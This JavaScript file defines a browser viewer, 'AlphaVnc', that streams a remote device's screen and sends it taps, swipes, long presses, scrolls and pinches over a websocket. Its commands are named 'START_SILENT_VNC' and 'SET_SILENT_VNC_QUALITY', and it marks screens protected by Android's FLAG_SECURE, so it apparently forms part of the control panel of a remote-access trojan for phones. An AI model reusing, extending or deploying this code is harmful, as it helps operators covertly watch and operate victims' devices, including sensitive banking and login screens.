/**
 * vnc.js — Alpha VNC viewer.
 *
 * Features over Flash:
 *   - Worker GPU decode (zero-copy ImageBitmap transfer)
 *   - Accurate normalised coords from canvas bounding rect
 *   - Touch support: single tap, double tap, long press, scroll, pinch
 *   - Drag support: mousedown drag → DRAG command
 *   - FPS display, RTT estimate, quality indicator
 *   - FLAG_SECURE overlay badge
 *   - V1/V2 stream toggle
 *   - Clean start/stop — no memory leaks
 */
'use strict';

class AlphaVnc {

  constructor(canvas, ws, devId) {
    this.canvas  = canvas;
    this.ctx     = canvas.getContext('2d');
    this.ws      = ws;
    this.devId   = devId;
    this.active  = false;
    this.quality = 50;
    this.fps     = 20;
    this.secure  = false;

    // Stats
    this._frameCount = 0;
    this._fpsTimer   = null;
    this._lastFps    = 0;
    this._fpsEl      = null;

    // Worker
    this._worker = null;

    // Input state
    this._mouse   = { down: false, x: 0, y: 0, startX: 0, startY: 0, t: 0 };
    this._touches = new Map(); // touchId → {x,y}
    this._dblTimer = null;
    this._lpTimer  = null;

    // Bind input handlers
    this._onMouseDown  = this._onMouseDown.bind(this);
    this._onMouseMove  = this._onMouseMove.bind(this);
    this._onMouseUp    = this._onMouseUp.bind(this);
    this._onWheel      = this._onWheel.bind(this);
    this._onContextMenu= this._onContextMenu.bind(this);
    this._onTouchStart = this._onTouchStart.bind(this);
    this._onTouchMove  = this._onTouchMove.bind(this);
    this._onTouchEnd   = this._onTouchEnd.bind(this);

    this._attachInput();
    this._startWorker();
  }

  // ── Start/stop ───────────────────────────────────────────────────────────────

  start(quality = 50, fps = 20) {
    this.quality = quality;
    this.fps     = fps;
    this.active  = true;
    this.ws.send({
      type: 'cmd', devId: this.devId, cmd: 'START_SILENT_VNC',
      args: { quality, fps }
    });
    this._startFpsCounter();
  }

  stop() {
    this.active = false;
    this.ws.send({ type: 'cmd', devId: this.devId,
                   cmd: 'STOP_SILENT_VNC', args: {} });
    this._stopFpsCounter();
    // Fade canvas to dark
    this.ctx.fillStyle = 'rgba(0,0,0,0.6)';
    this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
  }

  destroy() {
    this.stop();
    this._detachInput();
    this._stopFpsCounter();
    if (this._worker) { this._worker.terminate(); this._worker = null; }
  }

  setQuality(q) {
    this.quality = q;
    this.ws.cmd(this.devId, 'SET_SILENT_VNC_QUALITY', { quality: q });
  }

  setFps(f) {
    this.fps = f;
    this.ws.cmd(this.devId, 'SET_VNC_FPS', { fps: f });
  }

  setFpsDisplay(el) { this._fpsEl = el; }

  // ── Frame receiver (called by dash.js when ws emits vnc_frame) ───────────────

  onFrame({ type, devId, seq, quality, tsMs, jpeg }) {
    if (devId !== this.devId || !this.active) return;
    this._worker?.postMessage({ jpeg, seq, tsMs }, [jpeg]);
  }

  onSecureWindow(secure) {
    this.secure = secure;
    this._drawSecureBadge(secure);
  }

  // ── Worker ───────────────────────────────────────────────────────────────────

  _startWorker() {
    this._worker = new Worker('/js/vnc-worker.js');
    this._worker.onmessage = ({ data }) => {
      const { bmp, seq } = data;
      if (!this.active) { bmp.close(); return; }

      // Fit canvas to device aspect ratio on first frame
      if (bmp.width !== this._lastBmpW || bmp.height !== this._lastBmpH) {
        this._lastBmpW = bmp.width;
        this._lastBmpH = bmp.height;
        this._fitCanvas(bmp.width, bmp.height);
      }

      this.ctx.drawImage(bmp, 0, 0, this.canvas.width, this.canvas.height);
      bmp.close();

      this._frameCount++;
      if (this.secure) this._drawSecureBadge(true);
    };
  }

  _fitCanvas(srcW, srcH) {
    const wrapper = this.canvas.parentElement;
    if (!wrapper) return;
    const maxW = wrapper.clientWidth  || 800;
    const maxH = wrapper.clientHeight || 600;
    const scale = Math.min(maxW / srcW, maxH / srcH, 1);
    this.canvas.width  = Math.round(srcW * scale);
    this.canvas.height = Math.round(srcH * scale);
    this.canvas.style.width  = this.canvas.width  + 'px';
    this.canvas.style.height = this.canvas.height + 'px';
  }

  // ── FPS counter ───────────────────────────────────────────────────────────────

  _startFpsCounter() {
    this._fpsTimer = setInterval(() => {
      this._lastFps    = this._frameCount;
      this._frameCount = 0;
      if (this._fpsEl) this._fpsEl.textContent = `${this._lastFps} fps`;
    }, 1000);
  }

  _stopFpsCounter() {
    clearInterval(this._fpsTimer);
    this._fpsTimer = null;
  }

  // ── Coordinate normalisation ──────────────────────────────────────────────────

  _norm(e) {
    const r = this.canvas.getBoundingClientRect();
    return {
      x: (e.clientX - r.left) / r.width,
      y: (e.clientY - r.top)  / r.height
    };
  }

  _normTouch(t) {
    const r = this.canvas.getBoundingClientRect();
    return {
      x: (t.clientX - r.left) / r.width,
      y: (t.clientY - r.top)  / r.height
    };
  }

  // ── Mouse input ───────────────────────────────────────────────────────────────

  _onMouseDown(e) {
    if (e.button === 2) return; // right-click handled separately
    e.preventDefault();
    const { x, y } = this._norm(e);
    this._mouse = { down: true, x, y, startX: x, startY: y, t: Date.now() };
    // Long press detection (500 ms hold)
    this._lpTimer = setTimeout(() => {
      if (this._mouse.down) {
        const dx = Math.abs(x - this._mouse.startX);
        const dy = Math.abs(y - this._mouse.startY);
        if (dx < 0.02 && dy < 0.02) {
          this.ws.cmd(this.devId, 'LONG_PRESS', { x, y, duration: 600 });
          this._mouse.down = false;
        }
      }
    }, 500);
  }

  _onMouseMove(e) {
    if (!this._mouse.down) return;
    const { x, y } = this._norm(e);
    this._mouse.x = x;
    this._mouse.y = y;
  }

  _onMouseUp(e) {
    if (!this._mouse.down) return;
    clearTimeout(this._lpTimer);
    const { x, y } = this._norm(e);
    const dx   = x - this._mouse.startX;
    const dy   = y - this._mouse.startY;
    const dist = Math.sqrt(dx*dx + dy*dy);
    const dur  = Date.now() - this._mouse.t;
    this._mouse.down = false;

    if (dist < 0.02) {
      // TAP or DOUBLE_TAP
      if (this._dblTimer) {
        clearTimeout(this._dblTimer);
        this._dblTimer = null;
        this.ws.cmd(this.devId, 'DOUBLE_TAP', { x, y });
      } else {
        this._dblTimer = setTimeout(() => {
          this._dblTimer = null;
          this.ws.cmd(this.devId, 'TAP', { x, y });
        }, 220);
      }
    } else if (dist >= 0.02) {
      // SWIPE
      this.ws.cmd(this.devId, 'SWIPE', {
        x1: this._mouse.startX, y1: this._mouse.startY,
        x2: x, y2: y,
        duration: Math.max(80, Math.min(dur, 600))
      });
    }
  }

  _onContextMenu(e) {
    e.preventDefault();
    const { x, y } = this._norm(e);
    this.ws.cmd(this.devId, 'LONG_PRESS', { x, y, duration: 600 });
  }

  _onWheel(e) {
    e.preventDefault();
    const { x, y } = this._norm(e);
    const dy = e.deltaY > 0 ? 0.25 : -0.25;
    this.ws.cmd(this.devId, 'SCROLL', { x, y, deltaY: dy, duration: 150 });
  }

  // ── Touch input ───────────────────────────────────────────────────────────────

  _onTouchStart(e) {
    e.preventDefault();
    for (const t of e.changedTouches) {
      this._touches.set(t.identifier, this._normTouch(t));
    }
    if (this._touches.size === 1) {
      const [t] = e.changedTouches;
      const pos  = this._normTouch(t);
      this._mouse = { down: true, x: pos.x, y: pos.y,
                      startX: pos.x, startY: pos.y, t: Date.now() };
      this._lpTimer = setTimeout(() => {
        if (this._mouse.down) {
          this.ws.cmd(this.devId, 'LONG_PRESS',
                      { x: this._mouse.startX, y: this._mouse.startY, duration: 600 });
          this._mouse.down = false;
        }
      }, 500);
    }
    if (this._touches.size === 2) {
      clearTimeout(this._lpTimer);
      this._pinchStart = this._pinchDist();
    }
  }

  _onTouchMove(e) {
    e.preventDefault();
    for (const t of e.changedTouches) {
      this._touches.set(t.identifier, this._normTouch(t));
    }
    if (this._touches.size === 2) {
      this._mouse.down = false; // cancel single-finger gesture
    }
    if (this._touches.size === 1) {
      const [t]  = e.changedTouches;
      const pos  = this._normTouch(t);
      this._mouse.x = pos.x;
      this._mouse.y = pos.y;
    }
  }

  _onTouchEnd(e) {
    e.preventDefault();
    clearTimeout(this._lpTimer);
    for (const t of e.changedTouches) {
      this._touches.delete(t.identifier);
    }

    if (this._touches.size === 0 && this._mouse.down) {
      this._mouse.down = false;
      const x  = this._mouse.x, y  = this._mouse.y;
      const dx = x - this._mouse.startX, dy = y - this._mouse.startY;
      const dist = Math.sqrt(dx*dx + dy*dy);
      const dur  = Date.now() - this._mouse.t;

      if (dist < 0.025) {
        if (this._dblTimer) {
          clearTimeout(this._dblTimer);
          this._dblTimer = null;
          this.ws.cmd(this.devId, 'DOUBLE_TAP', { x, y });
        } else {
          this._dblTimer = setTimeout(() => {
            this._dblTimer = null;
            this.ws.cmd(this.devId, 'TAP', { x, y });
          }, 220);
        }
      } else {
        this.ws.cmd(this.devId, 'SWIPE', {
          x1: this._mouse.startX, y1: this._mouse.startY,
          x2: x, y2: y,
          duration: Math.max(80, Math.min(dur, 600))
        });
      }
    }

    if (this._touches.size === 1 && this._pinchStart !== undefined) {
      const endDist = this._pinchDist();
      const coords  = [...this._touches.values()];
      const cx = (coords[0].x + coords[1].x) / 2;
      const cy = (coords[0].y + coords[1].y) / 2;
      this.ws.cmd(this.devId, 'PINCH', {
        cx, cy,
        fromDist: this._pinchStart,
        toDist:   endDist,
        duration: 300
      });
      this._pinchStart = undefined;
    }
  }

  _pinchDist() {
    const pts = [...this._touches.values()];
    if (pts.length < 2) return 0;
    const dx = pts[0].x - pts[1].x;
    const dy = pts[0].y - pts[1].y;
    return Math.sqrt(dx*dx + dy*dy);
  }

  // ── Secure badge ──────────────────────────────────────────────────────────────

  _drawSecureBadge(show) {
    if (!show) return;
    const ctx = this.ctx;
    ctx.save();
    ctx.fillStyle = 'rgba(255,30,60,0.85)';
    ctx.font = 'bold 13px monospace';
    ctx.fillRect(4, 4, 90, 22);
    ctx.fillStyle = '#fff';
    ctx.fillText('⚠ SECURE', 10, 20);
    ctx.restore();
  }

  // ── Attach / detach input ─────────────────────────────────────────────────────

  _attachInput() {
    const c = this.canvas;
    c.addEventListener('mousedown',   this._onMouseDown,   { passive: false });
    c.addEventListener('mousemove',   this._onMouseMove,   { passive: false });
    c.addEventListener('mouseup',     this._onMouseUp,     { passive: false });
    c.addEventListener('wheel',       this._onWheel,       { passive: false });
    c.addEventListener('contextmenu', this._onContextMenu, { passive: false });
    c.addEventListener('touchstart',  this._onTouchStart,  { passive: false });
    c.addEventListener('touchmove',   this._onTouchMove,   { passive: false });
    c.addEventListener('touchend',    this._onTouchEnd,    { passive: false });
    c.style.touchAction = 'none';
  }

  _detachInput() {
    const c = this.canvas;
    c.removeEventListener('mousedown',   this._onMouseDown);
    c.removeEventListener('mousemove',   this._onMouseMove);
    c.removeEventListener('mouseup',     this._onMouseUp);
    c.removeEventListener('wheel',       this._onWheel);
    c.removeEventListener('contextmenu', this._onContextMenu);
    c.removeEventListener('touchstart',  this._onTouchStart);
    c.removeEventListener('touchmove',   this._onTouchMove);
    c.removeEventListener('touchend',    this._onTouchEnd);
  }
}

window.AlphaVnc = AlphaVnc;
